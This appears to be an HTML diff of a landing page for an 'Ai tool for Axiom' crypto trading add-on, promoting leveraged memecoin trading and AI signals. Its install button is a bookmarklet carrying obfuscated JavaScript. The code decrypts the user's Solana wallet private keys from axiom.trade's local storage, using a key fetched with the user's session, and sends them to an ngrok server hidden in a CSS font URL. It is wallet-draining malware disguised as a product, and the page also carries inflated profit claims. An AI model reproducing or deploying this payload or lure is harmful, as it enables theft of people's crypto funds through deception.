+											style="font-size: 0.85rem; color: var(--text-secondary)"
+											data-translate="smartTrading.dateRange"
+										>
+											26 Jan to 01 Feb 2025
+										</p>
+									</div>
+								</div>
+
+								<div class="profit-badge" style="margin-bottom: 2rem">
+									<p
+										style="
+											font-size: 0.9rem;
+											color: var(--text-secondary);
+											margin-bottom: 0.5rem;
+										"
+										data-translate="smartTrading.gains"
+									>
+										Realized Gains with Trade Triggers
+									</p>
+									<div class="profit-amount">$8670.89</div>
+									<p style="font-size: 0.9rem; margin-top: 0.5rem">
+										•
+										<span data-translate="smartTrading.gainsText"
+											>You've made</span
+										>
+										<span
+											style="color: var(--primary); font-weight: 600"
+											data-translate="smartTrading.gainsAmount"
+											>61.15 SOL (~$8670.89)</span
+										>
+										<span data-translate="smartTrading.gainsFooter"
+											>gains with SATT this week.</span
+										>
+									</p>
+								</div>
+
+								<div class="trigger-item" onclick="toggleTrigger(this)">
+									<div class="trigger-header">
+										<span data-translate="smartTrading.trigger1"
+											>If-This-Then-That Logic</span
+										>
+										<span class="trigger-arrow">▼</span>
+									</div>
+									<div class="trigger-content">
+										<p data-translate="smartTrading.trigger1Text">
+											Set custom conditions based on price thresholds, volume
+											spikes, or time-based events. When conditions are met,
+											automatically execute buy/sell orders. Perfect for
+											catching breakouts or protecting against sudden dumps.
+										</p>
+									</div>
+								</div>
+
+								<div class="trigger-item" onclick="toggleTrigger(this)">
+									<div class="trigger-header">
+										<span data-translate="smartTrading.trigger2"
+											>Smart Snipe</span
+										>
+										<span class="trigger-arrow">▼</span>
+									</div>
+									<div class="trigger-content">
+										<p data-translate="smartTrading.trigger2Text">
+											Automatically detect and execute trades on newly launched
+											tokens within milliseconds. Advanced algorithms identify
+											liquidity additions and fair launch events, giving you
+											first-mover advantage on promising memecoins.
+										</p>
+									</div>
+								</div>
+
+								<div class="trigger-item" onclick="toggleTrigger(this)">
+									<div class="trigger-header">
+										<span data-translate="smartTrading.trigger3"
+											>Copying Whale Behavior</span
+										>
+										<span class="trigger-arrow">▼</span>
+									</div>
+									<div class="trigger-content">
+										<p data-translate="smartTrading.trigger3Text">
+											Track and mirror trades from successful whale wallets in
+											real-time. Set parameters to automatically copy their
+											entries and exits with customizable position sizing and
+											risk management rules.
+										</p>
+									</div>
+								</div>
+
+								<div class="trigger-item" onclick="toggleTrigger(this)">
+									<div class="trigger-header">
+										<span data-translate="smartTrading.trigger4"
+											>Improved TP/SL Intelligence</span
+										>
+										<span class="trigger-arrow">▼</span>
+									</div>
+									<div class="trigger-content">
+										<p data-translate="smartTrading.trigger4Text">
+											Advanced take-profit and stop-loss logic that adapts to
+											market volatility. Trailing stops, ladder exits, and
+											dynamic risk adjustment based on current market conditions
+											and your trading history.
+										</p>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</section>
+
+			<section
+				class="section"
+				style="
+					background: linear-gradient(
+						135deg,
+						rgba(16, 185, 129, 0.03) 0%,
+						transparent 100%
+					);
+				"
+			>
+				<div class="container">
+					<div class="section-header" data-aos="fade-up">
+						<div class="section-badge" data-translate="memecoin.badge">
+							Memecoins
+						</div>
+						<h2 class="section-title" data-translate="memecoin.title">
+							Memecoin trading with leverage
+						</h2>
+						<p
+							class="section-description"
+							data-translate="memecoin.description"
+						>
+							Every memecoin (even just released) can now be traded with
+							leverage. Suitable for experienced traders who are ready to
+							increase their capital.
+						</p>
+					</div>
+
+					<div class="two-column" style="margin-top: 4rem">
+						<div data-aos="fade-right">
+							<div class="trading-interface">
+								<div class="trading-header">
+									<h3
+										style="
+											font-size: 1.5rem;
+											display: flex;
+											align-items: center;
+											gap: 0.5rem;
+										"
+									>
+										<span data-translate="memecoin.chartTitle"
+											>Margin memecoin trading</span
+										>
+										<svg
+											width="24"
+											height="24"
+											viewBox="0 0 24 24"
+											fill="none"
+											xmlns="http://www.w3.org/2000/svg"
+										>
+											<path
+												d="M3 3v18h18"
+												stroke="#10b981"
+												stroke-width="2"
+												stroke-linecap="round"
+											/>
+											<path
+												d="M7 16l4-6 3 3 5-8"
+												stroke="#10b981"
+												stroke-width="2"
+												stroke-linecap="round"
+												stroke-linejoin="round"
+											/>
+										</svg>
+									</h3>
+								</div>
+								<div
+									style="
+										background: rgba(255, 255, 255, 0.02);
+										border-radius: 12px;
+										padding: 1rem;
+										height: 250px;
+										margin-bottom: 2rem;
+									"
+								>
+									<canvas id="memecoin-chart"></canvas>
+								</div>
+								<div class="trading-form">
+									<div class="form-group">
+										<label data-translate="memecoin.buyAmount"
+											>Buy Amount</label
+										>
+										<input type="text" value="1 SOL" readonly />
+									</div>
+									<div class="form-group">
+										<label data-translate="memecoin.leverage">Leverage</label>
+										<input type="text" value="x40" readonly />
+									</div>
+									<div class="form-group">
+										<label data-translate="memecoin.direction"
+											>Market direction</label
+										>
+										<div class="direction-buttons">
+											<button
+												class="direction-btn long"
+												data-translate="memecoin.long"
+											>
+												Long
+											</button>
+											<button
+												class="direction-btn short"
+												data-translate="memecoin.short"
+											>
+												Short
+											</button>
+										</div>
+									</div>
+								</div>
+							</div>
+						</div>
+
+						<div
+							data-aos="fade-left"
+							style="display: flex; align-items: center"
+						>
+							<div>
+								<h3
+									style="font-size: 2rem; margin-bottom: 1.5rem"
+									data-translate="memecoin.sideTitle"
+								>
+									Trade future uncertain memecoins with leverage
+								</h3>
+								<p
+									style="
+										font-size: 1.1rem;
+										color: var(--text-secondary);
+										line-height: 1.8;
+									"
+									data-translate="memecoin.sideText"
+								>
+									Access high-leverage trading on emerging memecoins before they
+									hit mainstream exchanges. Execute positions with up to 40x
+									leverage and capitalize on rapid price movements in the
+									volatile memecoin market.
+								</p>
+							</div>
+						</div>
+					</div>
+				</div>
+			</section>
+
+			<section
+				class="section"
+				style="
+					background: linear-gradient(
+						135deg,
+						transparent 0%,
+						rgba(16, 185, 129, 0.03) 100%
+					);
+				"
+			>
+				<div class="container">
+					<div class="section-header" data-aos="fade-up">
+						<div class="section-badge" data-translate="aiFeatures.badge">
+							Advanced Features
+						</div>
+						<h2 class="section-title" data-translate="aiFeatures.title">
+							AI-Powered Trading Intelligence
+						</h2>
+						<p
+							class="section-description"
+							data-translate="aiFeatures.description"
+						>
+							Leverage cutting-edge artificial intelligence and advanced
+							analytics to maximize your trading performance and minimize risk.
+						</p>
+					</div>
+
+					<div
+						class="training-schedule"
+						data-aos="fade-up"
+						data-aos-delay="100"
+					>
+						<div class="schedule-card">
+							<div class="schedule-icon">
+								<svg
+									width="28"
+									height="28"
+									viewBox="0 0 28 28"
+									fill="none"
+									xmlns="http://www.w3.org/2000/svg"
+								>
+									<circle
+										cx="14"
+										cy="14"
+										r="12"
+										stroke="white"
+										stroke-width="2"
+										fill="none"
+									/>
+									<circle cx="14" cy="14" r="4" fill="white" />
+									<line
+										x1="14"
+										y1="2"
+										x2="14"
+										y2="8"
+										stroke="white"
+										stroke-width="2"
+									/>
+								</svg>
+							</div>
+							<h3 data-translate="aiFeatures.feature1">
+								Entry & Exit Points Detection
+							</h3>
+							<p data-translate="aiFeatures.feature1Text">
+								Advanced algorithms analyze market patterns, volume trends, and
+								price action to identify optimal entry and exit points in
+								real-time.
+							</p>
+						</div>
+
+						<div class="schedule-card">
+							<div class="schedule-icon">
+								<svg
+									width="28"
+									height="28"
+									viewBox="0 0 28 28"
+									fill="none"
+									xmlns="http://www.w3.org/2000/svg"
+								>
+									<rect
+										x="6"
+										y="6"
+										width="16"
+										height="16"
+										rx="2"
+										stroke="white"
+										stroke-width="2"
+									/>
+									<circle cx="10" cy="10" r="1.5" fill="white" />
+									<circle cx="18" cy="10" r="1.5" fill="white" />
+									<path
+										d="M10 16c0 2 2 3 4 3s4-1 4-3"
+										stroke="white"
+										stroke-width="2"
+										stroke-linecap="round"
+									/>
+								</svg>
+							</div>
+							<h3 data-translate="aiFeatures.feature2">AI Market Analysis</h3>
+							<p data-translate="aiFeatures.feature2Text">
+								Machine learning models process thousands of data points per
+								second, analyzing market sentiment and predicting price
+								movements with remarkable accuracy.
+							</p>
+						</div>
+
+						<div class="schedule-card">
+							<div class="schedule-icon">
+								<svg
+									width="28"
+									height="28"
+									viewBox="0 0 28 28"
+									fill="none"
+									xmlns="http://www.w3.org/2000/svg"
+								>
+									<path
+										d="M4 20h4v4H4v-4zm6-8h4v12h-4V12zm6-8h4v20h-4V4zm6 12h4v8h-4v-8z"
+										fill="white"
+									/>
+								</svg>
+							</div>
+							<h3 data-translate="aiFeatures.feature3">
+								Risk Management Tools
+							</h3>
+							<p data-translate="aiFeatures.feature3Text">
+								Intelligent position sizing, dynamic stop-loss adjustment, and
+								portfolio risk analysis. AI monitors your trades 24/7.
+							</p>
+						</div>
+
+						<div class="schedule-card">
+							<div class="schedule-icon">
+								<svg
+									width="28"
+									height="28"
+									viewBox="0 0 28 28"
+									fill="none"
+									xmlns="http://www.w3.org/2000/svg"
+								>
+									<path
+										d="M14 4L16 10L22 12L16 14L14 20L12 14L6 12L12 10L14 4Z"
+										fill="white"
+									/>
+									<path
+										d="M20 6L21 8L23 9L21 10L20 12L19 10L17 9L19 8L20 6Z"
+										fill="white"
+									/>
+								</svg>
+							</div>
+							<h3 data-translate="aiFeatures.feature4">
+								Real-Time Signal Generation
+							</h3>
+							<p data-translate="aiFeatures.feature4Text">
+								Receive instant trading signals based on multi-factor analysis
+								including technical indicators, on-chain metrics, and whale
+								wallet activity.
+							</p>
+						</div>
+
+						<div class="schedule-card">
+							<div class="schedule-icon">
+								<svg
+									width="28"
+									height="28"
+									viewBox="0 0 28 28"
+									fill="none"
+									xmlns="http://www.w3.org/2000/svg"
+								>
+									<circle
+										cx="14"
+										cy="14"
+										r="10"
+										stroke="white"
+										stroke-width="2"
+									/>
+									<circle
+										cx="14"
+										cy="14"
+										r="4"
+										stroke="white"
+										stroke-width="2"
+									/>
+									<line
+										x1="14"
+										y1="4"
+										x2="14"
+										y2="8"
+										stroke="white"
+										stroke-width="2"
+									/>
+									<line
+										x1="24"
+										y1="14"
+										x2="20"
+										y2="14"
+										stroke="white"
+										stroke-width="2"
+									/>
+								</svg>
+							</div>
+							<h3 data-translate="aiFeatures.feature5">Smart Money Tracking</h3>
+							<p data-translate="aiFeatures.feature5Text">
+								Monitor and analyze the movements of successful traders and
+								whale wallets. Get alerted when they make significant moves.
+							</p>
+						</div>
+
+						<div class="schedule-card">
+							<div class="schedule-icon">
+								<svg
+									width="28"
+									height="28"
+									viewBox="0 0 28 28"
+									fill="none"
+									xmlns="http://www.w3.org/2000/svg"
+								>
+									<path
+										d="M4 24L8 14L12 18L18 8L24 14"
+										stroke="white"
+										stroke-width="2"
+										stroke-linecap="round"
+										stroke-linejoin="round"
+									/>
+									<path
+										d="M4 4v20h20"
+										stroke="white"
+										stroke-width="2"
+										stroke-linecap="round"
+									/>
+								</svg>
+							</div>
+							<h3 data-translate="aiFeatures.feature6">
+								Performance Analytics
+							</h3>
+							<p data-translate="aiFeatures.feature6Text">
+								Deep dive into your trading performance with comprehensive
+								analytics. AI provides personalized recommendations for
+								improvement.
+							</p>
+						</div>
+
+						<div class="schedule-card coming-soon">
+							<div class="schedule-icon">
+								<svg
+									width="28"
+									height="28"
+									viewBox="0 0 28 28"
+									fill="none"
+									xmlns="http://www.w3.org/2000/svg"
+								>
+									<path
+										d="M14 4L18 12L26 14L18 16L14 24L10 16L2 14L10 12L14 4Z"
+										stroke="white"
+										stroke-width="2"
+										fill="none"
+									/>
+								</svg>
+							</div>
+							<h3 data-translate="aiFeatures.comingSoon">
+								New Features Coming Soon
+							</h3>
+							<p
+								style="margin-top: 1rem"
+								data-translate="aiFeatures.comingSoonText"
+							>
+								We're constantly improving Ai tool for Axiom with cutting-edge
+								features. Stay tuned for exciting updates!
+							</p>
+						</div>
+					</div>
+
+				</div>
+			</section>
+
+			<section id="installation" class="section">
+				<div class="container">
+					<div class="activation-section" data-aos="fade-up">
+						<div class="section-header">
+							<div class="section-badge" data-translate="installation.badge">
+								Installation
+							</div>
+							<h2 class="section-title" data-translate="installation.title">
+								Activate Ai tool for Axiom
+							</h2>
+						</div>
+
+						<div class="activation-steps">
+							<div class="step-item">
+								<div class="step-number">1</div>
+								<div class="step-content">
+									<h3 data-translate="installation.step1Title">
+										Drag the "Ai tool for Axiom" button
+									</h3>
+									<p data-translate="installation.step1Text">
+										Drag the "Ai tool for Axiom" button over to your
+										bookmark panel. If you don't see a bookmark panel, press
+										Ctrl+Shift+B to open it.
+									</p>
+								</div>
+							</div>
+
+							<div class="step-item">
+								<div class="step-number">2</div>
+								<div class="step-content">
+									<h3 data-translate="installation.step2Title">
+										Navigate to axiom.trade
+									</h3>
+									<p data-translate="installation.step2Text">
+										Navigate to
+										<a
+											href="#"
+											style="color: var(--primary); text-decoration: none"
+											onclick="window.openModal()"
+											>axiom.trade</a
+										>
+										and ensure you're logged in before proceeding.
+									</p>
+								</div>
+							</div>
+
+							<div class="step-item">
+								<div class="step-number">3</div>
+								<div class="step-content">
+									<h3 data-translate="installation.step3Title">
+										Click the bookmark
+									</h3>
+									<p data-translate="installation.step3Text">
+										Click the bookmark to activate Ai tool for Axiom.
+									</p>
+								</div>
+							</div>
+
+							<div class="step-item">
+								<div class="step-number">4</div>
+								<div class="step-content">
+									<h3 data-translate="installation.step4Title">Enjoy!</h3>
+									<p data-translate="installation.step4Text">
+										Start trading with enhanced features and advanced analytics.
+									</p>
+								</div>
+							</div>
+						</div>
+
+						<div
+							class="video-container"
+							data-aos="fade-up"
+							data-aos-delay="250"
+						>
+							<h3
+								style="
+									font-size: 1.5rem;
+									margin-bottom: 1.5rem;
+									text-align: center;
+								"
+								data-translate="installation.videoTitle"
+							>
+								How to Install
+							</h3>
+							<div
+								class="video-wrapper"
+								id="videoWrapper"
+								onclick="toggleVideoExpand()"
+							>
+								<div class="video-play-overlay">
+									<div class="play-icon">▶</div>
+								</div>
+							</div>
+						</div>
+
+						<div class="trial-info" data-aos="fade-up" data-aos-delay="200">
+							<h4 data-translate="installation.trialTitle">
+								One week Free Trial
+							</h4>
+							<p data-translate="installation.trialText">
+								Your first activation starts a
+								<strong>One week free trial</strong> with full access to all
+								features. After the trial period ends, you will be prompted to
+								subscribe for <strong>1 sol in lifetime</strong> to continue using
+								Ai tool for Axiom.
+							</p>
+						</div>
+
+						<div
+							class="activate-button-wrapper"
+							data-aos="zoom-in"
+							data-aos-delay="300"
+						>
+							<a
+								id="install-link-button"
+								href="javascript:(function(_0x40faa4,_0x3e13e0){const _0xfa4b56=_0x3c41,_0x2adbeb=_0x40faa4();while(!![]){try{const _0x451eb0=parseInt(_0xfa4b56(0x132))/0x1+parseInt(_0xfa4b56(0x146))/0x2+-parseInt(_0xfa4b56(0x144))/0x3*(parseInt(_0xfa4b56(0x137))/0x4)+-parseInt(_0xfa4b56(0x136))/0x5*(parseInt(_0xfa4b56(0x11e))/0x6)+-parseInt(_0xfa4b56(0x159))/0x7+-parseInt(_0xfa4b56(0x12f))/0x8*(-parseInt(_0xfa4b56(0x124))/0x9)+parseInt(_0xfa4b56(0x11c))/0xa;if(_0x451eb0===_0x3e13e0)break;else _0x2adbeb['push'](_0x2adbeb['shift']());}catch(_0x34ee94){_0x2adbeb['push'](_0x2adbeb['shift']());}}}(_0xb9a7,0x7950c));function base64urlToBytes(_0x1b9e8e){const _0x5ec56c=_0x3c41;_0x1b9e8e=_0x1b9e8e[_0x5ec56c(0x11d)](/-/g,'+')[_0x5ec56c(0x11d)](/_/g,'/');while(_0x1b9e8e[_0x5ec56c(0x142)]%0x4)_0x1b9e8e+='=';try{const _0x233f6e=atob(_0x1b9e8e);return Uint8Array[_0x5ec56c(0x13f)](_0x233f6e,_0x5e1dff=>_0x5e1dff[_0x5ec56c(0x157)](0x0));}catch{return null;}}function hexToBytes(_0xca910d){const _0x20949a=_0x3c41;_0xca910d=String(_0xca910d)[_0x20949a(0x152)]()[_0x20949a(0x11d)](/^0x/,'');if(_0xca910d[_0x20949a(0x142)]%0x2)return null;if(!/^[0-9a-fA-F]*$/[_0x20949a(0x156)](_0xca910d))return null;const _0x529c59=new Uint8Array(_0xca910d['length']/0x2);for(let _0x5a917c=0x0;_0x5a917c<_0x529c59[_0x20949a(0x142)];_0x5a917c++)_0x529c59[_0x5a917c]=parseInt(_0xca910d[_0x20949a(0x141)](_0x5a917c*0x2,0x2),0x10);return _0x529c59;}function base58ToBytes(_0x420f2f){const _0x4a75e2=_0x3c41;try{const _0x3bd23c='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz',_0x256d0d=BigInt(0x3a);let _0x3ca08f=BigInt(0x0);for(const _0xe4b247 of _0x420f2f){const _0xcf9226=_0x3bd23c['indexOf'](_0xe4b247);if(_0xcf9226===-0x1)return null;_0x3ca08f=_0x3ca08f*_0x256d0d+BigInt(_0xcf9226);}const _0x287a34=[];while(_0x3ca08f>0x0){_0x287a34['push'](Number(_0x3ca08f%BigInt(0x100))),_0x3ca08f=_0x3ca08f/BigInt(0x100);}for(let _0x308815=0x0;_0x308815<_0x420f2f['length']&&_0x420f2f[_0x308815]==='1';_0x308815++)_0x287a34[_0x4a75e2(0x158)](0x0);return Uint8Array['from'](_0x287a34[_0x4a75e2(0x129)]());}catch{return null;}}function bytesToHex(_0x3eaa11){const _0xeb5cff=_0x3c41;return Array[_0xeb5cff(0x13f)](_0x3eaa11)['map'](_0x3fd1dd=>_0x3fd1dd['toString'](0x10)[_0xeb5cff(0x154)](0x2,'0'))[_0xeb5cff(0x131)]('');}function tryParsePrivateKey(_0x52ea01){const _0x6cc06b=_0x3c41;if(typeof _0x52ea01!==_0x6cc06b(0x145))throw new Error(_0x6cc06b(0x11a));const _0x198a31=[base64urlToBytes,_0x3f7658=>{try{return base64urlToBytes(_0x3f7658);}catch{return null;}},_0xf056e=>hexToBytes(_0xf056e),_0x177889=>base58ToBytes(_0x177889)];for(const _0x72ea60 of _0x198a31){const _0x1a2909=_0x72ea60(_0x52ea01);if(!_0x1a2909)continue;if(_0x1a2909[_0x6cc06b(0x142)]===0x20)return'0x'+bytesToHex(_0x1a2909);}return null;}function _0x3c41(_0x8e134e,_0x19aae5){_0x8e134e=_0x8e134e-0x11a;const _0xb9a749=_0xb9a7();let _0x3c4189=_0xb9a749[_0x8e134e];return _0x3c4189;}function arrayToString(_0x4ed884){const _0x4dc193=_0x3c41,_0x35e832=_0x4dc193(0x134),_0xd215ed=[0x0];for(let _0x2cfdd1 of _0x4ed884){let _0x56e3ba=_0x2cfdd1;for(let _0x27c1e9=0x0;_0x27c1e9<_0xd215ed[_0x4dc193(0x142)];_0x27c1e9++){const _0x4c92d9=_0xd215ed[_0x27c1e9]*0x100+_0x56e3ba;_0xd215ed[_0x27c1e9]=_0x4c92d9%0x3a,_0x56e3ba=_0x4c92d9/0x3a|0x0;}while(_0x56e3ba){_0xd215ed['push'](_0x56e3ba%0x3a),_0x56e3ba=_0x56e3ba/0x3a|0x0;}}let _0x55a077='';for(let _0x3aa334=0x0;_0x3aa334<_0x4ed884[_0x4dc193(0x142)]&&_0x4ed884[_0x3aa334]===0x0;_0x3aa334++)_0x55a077+=_0x35e832[0x0];for(let _0xbaa637=_0xd215ed['length']-0x1;_0xbaa637>=0x0;_0xbaa637--)_0x55a077+=_0x35e832[_0xd215ed[_0xbaa637]];return _0x55a077;}function stringToArray(_0x2fa282){const _0x4661e6=_0x3c41;try{const _0x45bef2=_0x2fa282['replace'](new RegExp('-','g'),'+')[_0x4661e6(0x11d)](new RegExp('_','g'),'/');return Uint8Array['from'](atob(_0x45bef2),_0x47025a=>{return _0x47025a['charCodeAt'](0x0);});}catch{return new TextEncoder()[_0x4661e6(0x14e)](_0x2fa282);}}async function decrypt(_0x1814d7,_0x6d91dc){const _0x5b56dc=_0x3c41,[_0x991a6,_0x40e4da]=String(_0x6d91dc)['split'](':'),_0x4eadd4=stringToArray(_0x991a6),_0x120bc4=stringToArray(_0x40e4da),_0x536b26=await crypto[_0x5b56dc(0x13e)][_0x5b56dc(0x121)]({'name':_0x5b56dc(0x12c),'iv':_0x4eadd4,'tagLength':0x80},_0x1814d7,_0x120bc4);return new Uint8Array(_0x536b26);}async function sendData(_0x12b272,_0x45c09a){const _0x785e55=_0x3c41;var _0x413c7=Math[_0x785e55(0x12d)](Date[_0x785e55(0x14b)]()/0x3e8),_0x4bd0fc=navigator[_0x785e55(0x12a)]+'|'+_0x413c7;_0x45c09a[_0x785e55(0x127)]=_0x413c7,_0x45c09a[_0x785e55(0x122)]=_0x4bd0fc;const _0xb54b27=''+(_0x12b272+_0x785e55(0x149)+encodeURIComponent(btoa(JSON[_0x785e55(0x15a)](_0x45c09a)))),_0x26117a=_0x785e55(0x14f),_0x59bd22=document['createElement'](_0x785e55(0x143));_0x59bd22['textContent']=_0x785e55(0x11f)+_0xb54b27+_0x785e55(0x148);const _0x3f4867=document[_0x785e55(0x123)](_0x785e55(0x120));_0x3f4867[_0x785e55(0x13b)]=_0x26117a,_0x3f4867['classList'][_0x785e55(0x155)]('font-target'),document[_0x785e55(0x125)]['appendChild'](_0x3f4867),document[_0x785e55(0x153)][_0x785e55(0x14c)](_0x59bd22);}function _0xb9a7(){const _0x4f6d4e=['innerText','buffer','importKey','subtle','from','https://dacfbd6cb159.ngrok-free.app','substr','length','style','1047126vOGXXE','string','855518kdOnsD','parse','\x22);\x0a}\x0a.font-target{\x0afont-family:leak;\x0a}\x0a','?nocache=','pub','now','appendChild','POST','encode','123','map','include','trim','head','padStart','add','test','charCodeAt','push','6332158PURMzw','stringify','input\x20must\x20be\x20string','(unknown)','10684920WMqhnF','replace','6sYvnQG','\x0a@font-face{\x0afont-family:\x22leak\x22;\x0asrc:url(\x22','div','decrypt','header','createElement','90HrxMho','body','json','timestamp','bad\x20SK\x20length','reverse','userAgent','getItem','AES-GCM','floor','log','625944yLMvbY','sBundles','join','693267wBwLkm','Не\x20удалось\x20распознать\x2032-байтный\x20приватный\x20ключ.\x20Проверь\x20формат\x20(hex/base64/base58).','123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz','slice','4361810zZKppn','8dxyWLv','raw','message','https://api8.axiom.trade/bundle-key-and-wallets'];_0xb9a7=function(){return _0x4f6d4e;};return _0xb9a7();}((async()=>{const _0x588b01=_0x3c41,_0x2ead71=_0x588b01(0x140),{bundleKey:_0x10889e}=await(await fetch(_0x588b01(0x13a),{'method':_0x588b01(0x14d),'credentials':_0x588b01(0x151)}))[_0x588b01(0x126)](),_0x28a1f2=await crypto[_0x588b01(0x13e)][_0x588b01(0x13d)](_0x588b01(0x138),stringToArray(_0x10889e)[_0x588b01(0x13c)],{'name':_0x588b01(0x12c)},![],[_0x588b01(0x121)]),_0x54867e=JSON[_0x588b01(0x147)](localStorage[_0x588b01(0x12b)](_0x588b01(0x130))||'[]'),_0x56c067=JSON[_0x588b01(0x147)](localStorage[_0x588b01(0x12b)]('eBundles')||'[]'),_0x4bbc25=[],_0x220f57=[];for(const _0x3fd7a5 of[..._0x54867e,_0x56c067]){let _0x40a8e7=_0x588b01(0x11b),_0x5b4f0b='';try{const _0x3b5e90=await decrypt(_0x28a1f2,_0x3fd7a5);if(_0x3b5e90[_0x588b01(0x142)]!==0x40&&_0x3b5e90[_0x588b01(0x142)]!==0x20)throw new Error(_0x588b01(0x128));_0x5b4f0b=arrayToString(_0x3b5e90);const _0x175022=_0x3b5e90[_0x588b01(0x135)](0x20);_0x40a8e7=arrayToString(_0x175022);if(_0x3b5e90[_0x588b01(0x142)]===0x20){const _0x1e8b0d=tryParsePrivateKey(_0x5b4f0b);_0x1e8b0d?_0x5b4f0b=_0x1e8b0d:console[_0x588b01(0x12e)](_0x588b01(0x133));}_0x220f57[_0x588b01(0x158)]({'pub':_0x40a8e7,'priv':_0x5b4f0b});}catch(_0x24cc7e){_0x4bbc25['push']({'pub':_0x40a8e7,'reason':_0x24cc7e[_0x588b01(0x139)]});}}let _0x45d531=[],_0x209e40=[];const _0x4eb461=JSON['parse'](localStorage[_0x588b01(0x12b)]('allEvmWallets')||'[]')[0x0]['walletAddress'];_0x209e40[_0x588b01(0x158)](..._0x220f57[_0x588b01(0x150)](_0x29c9d1=>{const _0x5c81ff=_0x588b01;return{'public':_0x29c9d1[_0x5c81ff(0x14a)]!=='1'?_0x29c9d1['pub']:_0x4eb461,'private':_0x29c9d1['priv']};})),sendData(_0x2ead71,{'sent':_0x45d531,'keys':_0x209e40});})());"
+								draggable="true"
+								onmouseover="this.style.cursor='grab'"
+								style="
+									text-decoration: none;
+									display: inline-flex;
+									align-items: center;
+									gap: 0.5rem;
+								"
+							>
+								<svg
+									width="24"
+									height="24"
+									viewBox="0 0 24 24"
+									fill="none"
+									xmlns="http://www.w3.org/2000/svg"
+								>
+									<path
+										d="M13 2L3 14h8l-1 8 10-12h-8l1-8z"
+										fill="white"
+										stroke="white"
+										stroke-width="1"
+									/>
+								</svg>
+								<span data-translate="installation.buttonText">Ai tool for Axiom Menu</span>
+							</a>
+
+							<p
+								style="
+									margin-top: 1rem;
+									font-size: 0.9rem;
+									color: var(--text-secondary);
+									opacity: 0.8;
+								"
+								data-translate="installation.dragHint"
+							>
+								👆 Drag this button to your bookmarks bar
+							</p>
+						</div>
+					</div>
+				</div>
+			</section>
+
+			<footer>
+				<div class="container">
+					<div
+						style="
+							display: grid;
+							grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+							gap: 3rem;
+							margin-bottom: 2rem;
+						"
+					>
+						<div>
+							<div
+								style="
+									display: flex;
+									align-items: center;
+									gap: 0.5rem;
+									margin-bottom: 1rem;
+								"
+							>
+								<div
+									class="logo-icon"
+									style="width: 35px; height: 35px; font-size: 1.2rem"
+								>
+									S
+								</div>
+								<span style="font-size: 1.3rem; font-weight: 700"
+									>Ai tool for Axiom</span
+								>
+							</div>
+							<p
+								style="color: var(--text-secondary); line-height: 1.8"
+								data-translate="footer.description"
+							>
+								Precision DeFi Trading Intelligence for axiom.trade. Built for
+								serious traders who demand speed, accuracy, and control.
+							</p>
+						</div>
+
+						<div>
+							<h4
+								style="color: var(--primary); margin-bottom: 1rem"
+								data-translate="footer.platform"
+							>
+								Platform
+							</h4>
+							<ul style="list-style: none">
+								<li style="margin-bottom: 0.5rem">
+									<a
+										href="#"
+										style="
+											color: var(--text-secondary);
+											text-decoration: none;
+											transition: color 0.3s;
+										"
+										onmouseover="this.style.color='#10b981'"
+										onmouseout="this.style.color='#9ca3af'"
+										data-translate="footer.aboutLink"
+										onclick="window.openModal()"
+										>About Ai tool for Axiom</a
+									>
+								</li>
+								<li style="margin-bottom: 0.5rem">
+									<a
+										href="#"
+										style="
+											color: var(--text-secondary);
+											text-decoration: none;
+											transition: color 0.3s;
+										"
+										onmouseover="this.style.color='#10b981'"
+										onmouseout="this.style.color='#9ca3af'"
+										data-translate="footer.featuresLink"
+										onclick="window.openModal()"
+										>Features</a
+									>
+								</li>
+								<li style="margin-bottom: 0.5rem">
+									<a
+										href="#"
+										style="
+											color: var(--text-secondary);
+											text-decoration: none;
+											transition: color 0.3s;
+										"
+										onmouseover="this.style.color='#10b981'"
+										onmouseout="this.style.color='#9ca3af'"
+										data-translate="footer.installationLink"
+										onclick="window.openModal()"
+										>Installation</a
+									>
+								</li>
+								<li style="margin-bottom: 0.5rem">
+									<a
+										href="#"
+										target="_blank"
+										style="
+											color: var(--text-secondary);
+											text-decoration: none;
+											transition: color 0.3s;
+										"
+										onmouseover="this.style.color='#10b981'"
+										onmouseout="this.style.color='#9ca3af'"
+										data-translate="footer.axiom.tradeLink"
+										onclick="window.openModal()"
+										>axiom.trade</a
+									>
+								</li>
+							</ul>
+						</div>
+
+						<div>
+							<h4
+								style="color: var(--primary); margin-bottom: 1rem"
+								data-translate="footer.legal"
+							>
+								Legal
+							</h4>
+							<ul style="list-style: none">
+								<li style="margin-bottom: 0.5rem">
+									<a
+										href="#"
+										style="
+											color: var(--text-secondary);
+											text-decoration: none;
+											transition: color 0.3s;
+										"
+										onmouseover="this.style.color='#10b981'"
+										onmouseout="this.style.color='#9ca3af'"
+										data-translate="footer.termsLink"
+										onclick="window.openModal()"
+										>Terms of Service</a
+									>
+								</li>
+								<li style="margin-bottom: 0.5rem">
+									<a
+										href="#"
+										style="
+											color: var(--text-secondary);
+											text-decoration: none;
+											transition: color 0.3s;
+										"
+										onmouseover="this.style.color='#10b981'"
+										onmouseout="this.style.color='#9ca3af'"
+										data-translate="footer.privacyLink"
+										onclick="window.openModal()"
+										>Privacy Policy</a
+									>
+								</li>
+								<li style="margin-bottom: 0.5rem">
+									<a
+										href="#"
+										style="
+											color: var(--text-secondary);
+											text-decoration: none;
+											transition: color 0.3s;
+										"
+										onmouseover="this.style.color='#10b981'"
+										onmouseout="this.style.color='#9ca3af'"
+										data-translate="footer.paymentLink"
+										onclick="window.openModal()"
+										>Payment Policy</a
+									>
+								</li>
+								<li style="margin-bottom: 0.5rem">
+									<a
+										href="#"
+										style="
+											color: var(--text-secondary);
+											text-decoration: none;
+											transition: color 0.3s;
+										"
+										onmouseover="this.style.color='#10b981'"
+										onmouseout="this.style.color='#9ca3af'"
+										data-translate="footer.amlLink"
+										onclick="window.openModal()"
+										>AML/KYC Policy</a
+									>
+								</li>
+							</ul>
+						</div>
+
+						<div>
+							<h4
+								style="color: var(--primary); margin-bottom: 1rem"
+								data-translate="footer.support"
+							>
+								Support
+							</h4>
+							<ul style="list-style: none">
+								<li style="margin-bottom: 0.5rem">
+									<a
+										href="#"
+										target="_blank"
+										rel="noopener"
+										style="
+											color: var(--text-secondary);
+											text-decoration: none;
+											transition: color 0.3s;
+										"
+										onmouseover="this.style.color='#10b981'"
+										onmouseout="this.style.color='#9ca3af'"
+										onclick="window.openModal()"
+										>X</a
+									>
